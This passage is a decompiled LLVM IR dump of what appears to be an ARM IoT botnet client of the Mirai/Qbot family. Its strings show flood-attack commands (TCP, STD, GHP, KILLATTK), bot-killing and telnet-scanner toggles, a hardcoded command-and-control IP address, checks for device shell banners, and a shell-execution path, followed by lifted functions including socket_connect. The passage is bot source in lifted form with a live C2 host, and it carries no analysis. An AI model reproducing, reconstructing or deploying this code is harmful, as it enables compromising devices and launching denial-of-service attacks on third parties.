@global_var_1dd70.789, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1dd7c.790, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1dd88.791, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1dd90.792, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1dd9c.793, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1dda4.794, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1ddac.795, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1ddb8.796, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1ddc4.797, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_1ddd0.798, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1dde0.799, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1ddec.800, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1ddf8.801, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_1de04.802, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1de14.803, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1de20.804, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1de2c.805, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1de38.806, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1de40.807, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1de48.808, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1de54.809, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1de5c.810, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1de68.811, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1de74.812, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1de80.813, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1de8c.814, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1de98.815, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1dea4.816, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1deb0.817, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1debc.818, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1dec8.819, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1ded4.820, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1dee0.821, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1deec.822, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1def8.823, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1df04.824, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1df10.825, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1df1c.826, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1df28.827, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1df34.828, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1df40.829, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1df4c.830, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1df58.831, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1df64.832, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1df70.833, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1df80.834, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1df8c.835, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1df98.836, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1dfa4.837, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1dfb0.838, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1dfbc.839, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1dfc8.840, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1dfd4.841, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1dfe0.842, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1dfec.843, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1dff8.844, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1e004.845, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1e010.846, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1e020.847, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1e030.848, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1e03c.849, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1e04c.850, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1e05c.851, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1e06c.852, i32 0, i32 0), i8* getelementptr inbounds ([24 x i8], [24 x i8]* @global_var_1e078.853, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1e090.854, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1e09c.855, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1e0a8.856, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1e0b4.857, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1e0c0.858, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1e0d0.859, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1e0dc.860, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1e0ec.861, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1e0f8.862, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1e104.863, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1e110.864, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1e120.865, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1e12c.866, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1e13c.867, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1e148.868, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1e154.869, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1e160.870, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1e16c.871, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1e178.872, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1e188.873, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1e194.874, i32 0, i32 0)]
@global_var_1f6e0.899 = constant i32 34
@global_var_1f6e4.901 = constant [6 x i8] c"close\00"
@global_var_1f6ec.902 = constant [11 x i8] c"keep-alive\00"
@global_var_1f6f8.903 = constant [7 x i8] c"accept\00"
@global_var_1f700.904 = constant [3 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1f6e4.901, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1f6ec.902, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1f6f8.903, i32 0, i32 0)]
@global_var_1f70c.910 = constant [62 x i8] c"%s %s HTTP/1.1\0D\0AConnection: %s\0D\0AAccept: */*\0D\0AUser-Agent: %s\0D\0A\00"
@global_var_1f74c.912 = constant [4 x i8] c"all\00"
@global_var_1f750.914 = constant i32 44
@global_var_1f754.916 = constant [4 x i8] c"syn\00"
@global_var_1f758.918 = constant [4 x i8] c"rst\00"
@global_var_1f75c.920 = constant [4 x i8] c"fin\00"
@global_var_1f760.922 = constant [4 x i8] c"ack\00"
@global_var_1f764.924 = constant [4 x i8] c"psh\00"
@global_var_1f768.926 = constant [4 x i8] c"std\00"
@global_var_1f76c.930 = constant [6 x i8] c"PONG!\00"
@global_var_1f774.932 = constant [7 x i8] c"TELNET\00"
@global_var_1f77c.934 = constant [16 x i8] c"TELNET ON | OFF\00"
@global_var_1f78c.936 = constant [4 x i8] c"OFF\00"
@global_var_2fb90.938 = global i32 0
@global_var_1f790.940 = constant [13 x i8] c"[TELNET] OFF\00"
@global_var_1f7a0.942 = constant [3 x i8] c"ON\00"
@global_var_1f7a4.944 = constant [12 x i8] c"[TELNET] ON\00"
@global_var_1f7b0.946 = constant [8 x i8] c"BOTKILL\00"
@global_var_1f7b8.949 = constant [13 x i8] c"Killing - %s\00"
@global_var_1f7c8.951 = constant [4 x i8] c"TCP\00"
@global_var_1f7cc.954 = constant [4 x i8] c"STD\00"
@global_var_1f7d0.956 = constant [4 x i8] c"GHP\00"
@global_var_1f7d4.958 = constant [9 x i8] c"KILLATTK\00"
@global_var_1f7e0.962 = constant [15 x i8] c"URSTRAITKANCER\00"
@global_var_29584.965 = local_unnamed_addr global i32 -1
@global_var_1b140.967 = constant [15 x i8] c"185.158.113.30\00"
@global_var_29024.968 = global [15 x i8]* @global_var_1b140.967
@global_var_29028.970 = local_unnamed_addr global i32 352
@global_var_1f7f0.972 = constant [8 x i8] c"8.8.8.8\00"
@global_var_1f7f8.975 = constant [16 x i8] c"/proc/net/route\00"
@global_var_1f808.977 = constant [11 x i8] c"\0900000000\09\00"
@global_var_2991c.979 = global i32 0
@global_var_1f814.981 = constant [8 x i8] c"UNKNOWN\00"
@global_var_1f81c.983 = constant [16 x i8] c"/usr/bin/python\00"
@global_var_1f82c.985 = constant [7 x i8] c"SERVER\00"
@global_var_1f834.987 = constant [7 x i8] c"ROUTER\00"
@global_var_1f83c.989 = constant i32 0
@global_var_1f840.993 = constant [19 x i8] c"/usr/sbin/dropbear\00"
@global_var_29580.995 = global i32 1
@global_var_1f854.997 = constant i32 47
@global_var_1f858.1001 = constant [43 x i8] c"[ %s CONNECTED ] [ %s: ] [ Arch Type: %s ]\00"
@global_var_1f884.1006 = constant [5 x i8] c"PONG\00"
@global_var_1f88c.1008 = constant [4 x i8] c"DUP\00"
@global_var_1f890.1010 = constant [5 x i8] c"MOVE\00"
@global_var_1f898.1012 = constant [8 x i8] c"%s 2>&1\00"
@1 = constant [3 x i32] %wide-string
@global_var_1f8a4.1016 = constant i32 32
@global_var_29594 = external global i32
@global_var_2959c = external local_unnamed_addr global i32
@global_var_2fb60.1026 = global i32 0
@global_var_1fea8.1031 = constant i32 0
@global_var_295b8.1033 = global i32 0
@global_var_295d0.1035 = global i32 0
@global_var_295b4.1037 = global i32* bitcast (i8** @global_var_295ec.1021 to i32*)
@global_var_12dd8.1040 = constant i32 -382910448
@global_var_16418.1041 = constant i32 -382909968
@global_var_164d4.1042 = constant i32 -382910224
@global_var_1fedc.1044 = constant i32 135270416
@global_var_1fec0.1046 = constant [6 x i8] c"(nil)\00"
@global_var_1fec8.1049 = constant [7 x i8] c"(null)\00"
@global_var_1fed0.1051 = constant i32 2949163
@global_var_1ff5c.1054 = constant i32 16843008
@global_var_1ff44.1056 = constant i32 327688
@global_var_1ff3c.1061 = constant [8 x i8] c" +0-#'I\00"
@global_var_1fee4.1063 = constant [9 x i8] c"hlLjztqZ\00"
@global_var_1ff24.1065 = constant [21 x i8] c"npxXoudifFeEgGaACScs\00"
@global_var_1ff17.1067 = constant i32 117506048
@global_var_1ff18.1069 = constant i32 252117248
@global_var_1ff08.1071 = constant i32 331776
@global_var_1fef8.1073 = constant i32 335616
@global_var_13dcc.1074 = constant i32 -456978431
@global_var_1ff78.1080 = constant [8 x i8] c"Success\00"
@global_var_1ff68.1082 = constant [15 x i8] c"Unknown error \00"
@global_var_20cb2.1084 = constant i32 65536
@global_var_298d0.1085 = global i32* @global_var_20cb2.1084
@global_var_2f934.1087 = global i32 0
@global_var_20b5c.1090 = constant [15 x i8] c"Resolver error\00"
@global_var_20adc.1092 = constant [8 x i8] c"Error 0\00"
@global_var_20ae4.1093 = constant [13 x i8] c"Unknown host\00"
@global_var_20af4.1094 = constant [25 x i8] c"Host name lookup failure\00"
@global_var_20b10.1095 = constant [21 x i8] c"Unknown server error\00"
@global_var_20b28.1096 = constant [32 x i8] c"No address associated with name\00"
@global_var_20b48.1097 = constant [5 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_20adc.1092, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_20ae4.1093, i32 0, i32 0), i8* getelementptr inbounds ([25 x i8], [25 x i8]* @global_var_20af4.1094, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @global_var_20b10.1095, i32 0, i32 0), i8* getelementptr inbounds ([32 x i8], [32 x i8]* @global_var_20b28.1096, i32 0, i32 0)]
@global_var_20b6c.1099 = constant [3 x i8] c": \00"
@global_var_20b6e.1101 = constant i32 0
@global_var_295a8 = external local_unnamed_addr global i32
@global_var_20ad4.1106 = constant [8 x i8] c"%s%s%s\0A\00"
@global_var_2f938.1108 = global i32 0
@global_var_2fb14.1110 = global i32 0
@global_var_2f948.1112 = global i32 0
@global_var_298d8.1114 = global i32 0
@global_var_2fc4c.1119 = global i32 0
@global_var_2fc40.1122 = global i32 0
@global_var_2fb98.1124 = global i32 0
@global_var_2fb28.1126 = global i32 0
@global_var_297d8.1129 = global i32 256
@global_var_296dc.1130 = global i32* @global_var_297d8.1129
@global_var_2fb50.1133 = global i32 0
@global_var_2fc18.1135 = global i32 0
@global_var_1622c.1136 = constant i32 -382910416
@global_var_14e9c.1143 = constant i32 -442564520
@global_var_297e4.1145 = global i32 0
@global_var_12ab0.1147 = constant i32 -481230848
@global_var_2fb40.1149 = global i32 0
@global_var_12734.1151 = constant i32 -509587456
@global_var_297fc.1153 = global i32 0
@global_var_29814 = external global i32
@global_var_29834.1159 = global i32 -1726662223
@global_var_2981c.1166 = local_unnamed_addr global i32* @global_var_29834.1159
@global_var_29818.1168 = global i32* @global_var_29834.1159
@global_var_20b70.1182 = constant i32 0
@global_var_1f31d.1186 = constant [5 x i8] c"d.%d\00"
@global_var_20b98.1190 = constant [8 x i8] c"/bin/sh\00"
@global_var_20ba0.1192 = constant [3 x i8] c"sh\00"
@global_var_20ba4.1194 = constant [3 x i8] c"-c\00"
@global_var_2fb44.1202 = local_unnamed_addr global i32 0
@global_var_12d20.1205 = constant i32 -382910416
@global_var_2fb4c.1207 = global i32 0
@global_var_29000.1210 = global i32 -1
@global_var_2fb54.1213 = global i32 0
@global_var_2fb58.1215 = local_unnamed_addr global i32 0
@global_var_15d1c.1216 = constant i32 -390234096
@global_var_20ba8.1218 = constant [10 x i8] c"/dev/null\00"
@global_var_2fb5c.1220 = global i32 0
@global_var_2fb48.1225 = local_unnamed_addr global i32 0
@global_var_13d40.1228 = constant i32 -369095394
@global_var_298c8 = external local_unnamed_addr global i32
@global_var_12bb0.1239 = constant i32 -442564608
@global_var_15fe4.1241 = constant i32 -335544701
@global_var_1611c.1244 = constant i32 -275775369
@global_var_2fb84.1246 = global i32 0
@global_var_2fb64.1248 = global i32 0
@global_var_20eb4.1252 = constant [4 x i8] c"inf\00"
@global_var_20ec8.1255 = constant i32 1076101120
@global_var_20eb7.1260 = constant i32 1179535616
@global_var_20ec4.1262 = constant i32 2883630
@global_var_2fb68.1274 = global i32 0
@global_var_2fb80.1279 = local_unnamed_addr global i32 0
@global_var_127b4.1284 = constant i32 -382910448
@global_var_2fc50.1287 = global i32 0
@global_var_20f10.1289 = constant i32 46
@global_var_2fc30.1291 = global i32 0
@global_var_14e1c.1293 = constant i32 -481296384
@global_var_18044.1294 = constant i32 -369098656
@global_var_20f14.1301 = constant [17 x i8] c"/etc/resolv.conf\00"
@global_var_20f28.1303 = constant i32 114
@global_var_20f2c.1305 = constant [24 x i8] c"/etc/config/resolv.conf\00"
@global_var_20f44.1308 = constant [11 x i8] c"nameserver\00"
@global_var_20f50.1311 = constant [7 x i8] c"domain\00"
@global_var_20f58.1313 = constant [7 x i8] c"search\00"
@global_var_2fc54.1318 = global i32 0
@global_var_2fc58.1320 = global i32 0
@global_var_2d92c.1327 = global i32 0
@global_var_186f4.1329 = constant i32 -442564544
@global_var_2d930.1331 = global i32 0
@global_var_20003.1339 = constant [4 x i8] c"ess\00"
@global_var_20000.1340 = constant [7 x i8] c"ddress\00"
@global_var_295e8.1343 = global i32 2
@global_var_18bd0.1349 = constant i32 -442564492
@global_var_20f74.1378 = constant [17 x i8] c"0123456789abcdef\00"
@global_var_20f60.1380 = constant i32 0
@global_var_20f88.1383 = constant [3 x i8] c"%x\00"
@global_var_20f8c.1386 = constant [11 x i8] c"/etc/hosts\00"
@global_var_20f98.1388 = constant [18 x i8] c"/etc/config/hosts\00"
@global_var_18e5c.1392 = constant i32 -382908944
@global_var_1a898.1394 = constant i32 -504313148
@global_var_1a880.1395 = constant i32 -483131392
@global_var_1a740.1396 = constant i32 -481294847
@global_var_1a8f8.1397 = constant i32 -477821825
@global_var_1a9f8.1398 = constant i32 -476034303
@global_var_1ace4.1399 = constant i32 -516685812
@global_var_1abe8.1400 = constant i32 -905969576
@global_var_1ad64.1401 = constant i32 -478149505
@global_var_1ad4c.1402 = constant i32 -534773758
@global_var_1ad00.1403 = constant i32 -534773758
@global_var_1ac98.1404 = constant i32 -483131392
@global_var_29004.1406 = global i32 0
@global_var_298f4.6 = external global i8*
@2 = internal constant [2 x i8] c"$\00"
@3 = internal constant [2 x i8] c"#\00"
@4 = internal constant [8 x i8] c"BusyBox\00"
@5 = internal constant [4 x i8] c"Box\00"
@6 = internal constant [6 x i8] c"shell\00"
@7 = internal constant [2 x i8] c"l\00"
@8 = internal constant [7 x i8] c"dvrdvs\00"
@9 = internal constant [3 x i8] c"vs\00"
@10 = internal constant [7 x i8] c"Kakuta\00"
@11 = internal constant [3 x i8] c"ta\00"
@global_var_1b3b8.37 = constant [10 x i8*] [i8* getelementptr inbounds ([2 x i8], [2 x i8]* @2, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @3, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @4, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @5, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @6, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @7, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @8, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @9, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @10, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @11, i32 0, i32 0)]
@global_var_29925.87 = local_unnamed_addr global i8 0
@global_var_29926.88 = local_unnamed_addr global i8 0
@12 = internal constant [3 x i8] c" \01\00"
@global_var_295ec.1021 = global i8* getelementptr inbounds ([3 x i8], [3 x i8]* @12, i32 0, i32 0)
@global_var_2963c.1022 = local_unnamed_addr global i8 16
@global_var_295ed.1028 = local_unnamed_addr global i8 1
@global_var_2963d.1029 = local_unnamed_addr global i8 1
@global_var_15d30.1039 = constant i8 0
@global_var_298b0.1198 = global i16* null
@13 = internal constant [2 x i8] c"\01\00"
@global_var_298d4.1281 = global i8* getelementptr inbounds ([2 x i8], [2 x i8]* @13, i32 0, i32 0)
@global_var_298d5.1282 = local_unnamed_addr global i8 0
@global_var_1f8a0.1014 = constant [2 x i8] c"r\00"

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @_init() local_unnamed_addr {
entry:
  %v3_8098 = load i32, i32* @r4, align 4
  %v0_80a0 = call i32 @frame_dummy()
  store i32 %v0_80a0, i32* @r0, align 4
  %v1_80a4 = call i32 @__do_global_ctors_aux(i32 %v0_80a0)
  call void @__pseudo_branch(i32 %v3_8098)
  ret i32 %v1_80a4
}

define i32 @__do_global_dtors_aux() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_80b0 = load i32, i32* @r4, align 4
  store i32 %v3_80b0, i32* %stack_var_-12, align 4
  store i32 ptrtoint (i8** @global_var_298f4.6 to i32), i32* %r5.global-to-local, align 4
  %v2_80b8 = load i8, i8* bitcast (i8** @global_var_298f4.6 to i8*), align 4
  %v2_80bc = icmp eq i8 %v2_80b8, 0
  br i1 %v2_80bc, label %bb7, label %bb

bb:                                               ; preds = %entry
  %v12_80c0 = load i32, i32* @r0, align 4
  ret i32 %v12_80c0

bb7:                                              ; preds = %entry
  store i32 ptrtoint (i32** @global_var_2901c.9 to i32), i32* %r4.global-to-local, align 4
  %v2_80c8 = load i32, i32* bitcast (i32** @global_var_2901c.9 to i32*), align 4
  store i32 %v2_80c8, i32* %r2.global-to-local, align 4
  %v2_80d0 = icmp eq i32 %v2_80c8, 0
  br i1 %v2_80d0, label %bb8, label %dec_label_pc_80d8

dec_label_pc_80d8:                                ; preds = %bb7, %dec_label_pc_80d8.dec_label_pc_80d8_crit_edge
  %v1_80dc = phi i32 [ %v1_80dc.pre, %dec_label_pc_80d8.dec_label_pc_80d8_crit_edge ], [ ptrtoint (i32** @global_var_2901c.9 to i32), %bb7 ]
  %v0_80d8 = phi i32 [ %v2_80e8, %dec_label_pc_80d8.dec_label_pc_80d8_crit_edge ], [ %v2_80c8, %bb7 ]
  %v1_80d8 = add i32 %v0_80d8, 4
  %v2_80dc = inttoptr i32 %v1_80dc to i32*
  store i32 %v1_80d8, i32* %v2_80dc, align 4
  %v0_80e4 = load i32, i32* %r2.global-to-local, align 4
  call void @__pseudo_branch(i32 %v0_80e4)
  %v2_80e8 = load i32, i32* bitcast (i32** @global_var_2901c.9 to i32*), align 4
  store i32 %v2_80e8, i32* %r2.global-to-local, align 4
  %v2_80f0 = icmp eq i32 %v2_80e8, 0
  br i1 %v2_80f0, label %.loopexit, label %dec_label_pc_80d8.dec_label_pc_80d8_crit_edge

dec_label_pc_80d8.dec_label_pc_80d8_crit_edge:    ; preds = %dec_label_pc_80d8
  %v1_80dc.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_80d8

.loopexit:                                        ; preds = %dec_label_pc_80d8
  %v2_8110.pre = load i32, i32* %r5.global-to-local, align 4
  br label %bb8

bb8:                                              ; preds = %.loopexit, %bb7
  %v2_8110 = phi i32 [ %v2_8110.pre, %.loopexit ], [ ptrtoint (i8** @global_var_298f4.6 to i32), %bb7 ]
  %v3_8110 = inttoptr i32 %v2_8110 to i8*
  store i8 1, i8* %v3_8110, align 1
  %v2_8114 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8114, i32* %r4.global-to-local, align 4
  %v11_8114 = load i32, i32* @r0, align 4
  ret i32 %v11_8114

; uselistorder directives
  uselistorder i32 %v2_80e8, { 1, 2, 0 }
  uselistorder i32** @global_var_2901c.9, { 1, 0 }
  uselistorder i8** @global_var_298f4.6, { 1, 0 }
  uselistorder label %dec_label_pc_80d8, { 1, 0 }
}

define i32 @call___do_global_dtors_aux() local_unnamed_addr {
entry:
  %v5_812c = load i32, i32* @r0, align 4
  ret i32 %v5_812c
}

define i32 @frame_dummy() local_unnamed_addr {
.thread:
  %v2_8150 = load i32, i32* @global_var_29010.19, align 4
  %v2_8154 = icmp eq i32 %v2_8150, 0
  br i1 %v2_8154, label %bb, label %bb2

bb:                                               ; preds = %.thread
  ret i32 ptrtoint (i32* @global_var_29010.19 to i32)

bb2:                                              ; preds = %.thread
  ret i32 ptrtoint (i32* @global_var_29010.19 to i32)

; uselistorder directives
  uselistorder i32* @global_var_29010.19, { 1, 0 }
}

define i32 @call_frame_dummy() local_unnamed_addr {
entry:
  %v5_818c = load i32, i32* @r0, align 4
  ret i32 %v5_818c
}

; Function Attrs: noreturn
define i32 @_start(i32 %arg1, i32 %arg2) local_unnamed_addr #0 {
entry:
  %stack_var_4 = alloca i32, align 4
  %v4_8198 = ptrtoint i32* %stack_var_4 to i32
  %v8_81b8 = call i32 @__uClibc_main(i32 ptrtoint (i32* @global_var_11878.23 to i32), i32 %arg2, i32* nonnull %stack_var_4, i32 32916, i32 110892, i32 %arg1, i32 %v4_8198)
  %v0_81bc = call i32 @abort()
  ret i32 %v0_81bc
}

define i32 @socket_connect(i32 %arg1, i8 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_81d0 = load i32, i32* @fp, align 4
  store i32 33240, i32* %stack_var_-4, align 4
  %v2_81d4 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_81d4, i32* @fp, align 4
  store i32 1, i32* %stack_var_-44, align 4
  %v1_81fc = call i32 @__GI_gethostbyname(i32 %arg1)
  %v2_820c = icmp eq i32 %v1_81fc, 0
  br i1 %v2_820c, label %dec_label_pc_8214, label %dec_label_pc_8220

dec_label_pc_8214:                                ; preds = %entry
  br label %dec_label_pc_8308

dec_label_pc_8220:                                ; preds = %entry
  %tmp = sext i8 %arg2 to i32
  %v1_8224 = add i32 %v1_81fc, 16
  %v2_8224 = inttoptr i32 %v1_8224 to i32*
  %v3_8224 = load i32, i32* %v2_8224, align 4
  %v1_8228 = inttoptr i32 %v3_8224 to i32*
  %v2_8228 = load i32, i32* %v1_8228, align 4
  %v1_8230 = add i32 %v1_81fc, 12
  %v2_8230 = inttoptr i32 %v1_8230 to i32*
  %v3_8230 = load i32, i32* %v2_8230, align 4
  store i32 %v3_8230, i32* @r2, align 4
  %v2_823c = ptrtoint i32* %stack_var_-36 to i32
  %v3_8248 = call i32 @bcopy(i32 %v2_8228, i32 %v2_823c, i32 %v3_8230)
  %v1_8260 = call i32 @htons(i32 %tmp)
  store i32 2, i32* %stack_var_-40, align 4
  %v0_8290 = call i32 @socket()
  %v6_82b8 = call i32 @__GI_setsockopt(i32 %v0_8290, i32 6, i32 1, i32* nonnull %stack_var_-44, i32 4)
  %v3_82c0 = icmp eq i32 %v0_8290, -1
  br i1 %v3_82c0, label %dec_label_pc_82c8, label %dec_label_pc_82d4

dec_label_pc_82c8:                                ; preds = %dec_label_pc_8220
  br label %dec_label_pc_8308

dec_label_pc_82d4:                                ; preds = %dec_label_pc_8220
  %v3_82e4 = bitcast i32* %stack_var_-40 to %sockaddr*
  %v4_82e4 = call i32 @__libc_connect(i32 %v0_8290, %sockaddr* %v3_82e4, i32 16)
  %v3_82ec = icmp eq i32 %v4_82e4, -1
  br i1 %v3_82ec, label %dec_label_pc_82f4, label %dec_label_pc_8300

dec_label_pc_82f4:                                ; preds = %dec_label_pc_82d4
  br label %dec_label_pc_8308

dec_label_pc_8300:                                ; preds = %dec_label_pc_82d4
  br label %dec_label_pc_8308

dec_label_pc_8308:                                ; preds = %dec_label_pc_82f4, %dec_label_pc_82c8, %dec_label_pc_8214, %dec_label_pc_8300
  %stack_var_-56.0 = phi i32 [ 0, %dec_label_pc_8214 ], [ 0, %dec_label_pc_82c8 ], [ 0, %dec_label_pc_82f4 ], [ %v0_8290, %dec_label_pc_8300 ]
  store i32 %v3_81d0, i32* @fp, align 4
  ret i32 %stack_var_-56.0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_8308, { 3, 0, 1, 2 }
}

define i32 @init_rand(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_8328 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_8328, i32* @global_var_29928.26, align 4
  %v1_8348 = add i32 %v0_8328, -1640531527
  store i32 %v1_8348, i32* @global_var_2992c.27, align 4
  %v1_8364 = add i32 %v0_8328, 1013904242
  store i32 %v1_8364, i32* @global_var_29930.28, align 4
  br label %dec_label_pc_837c

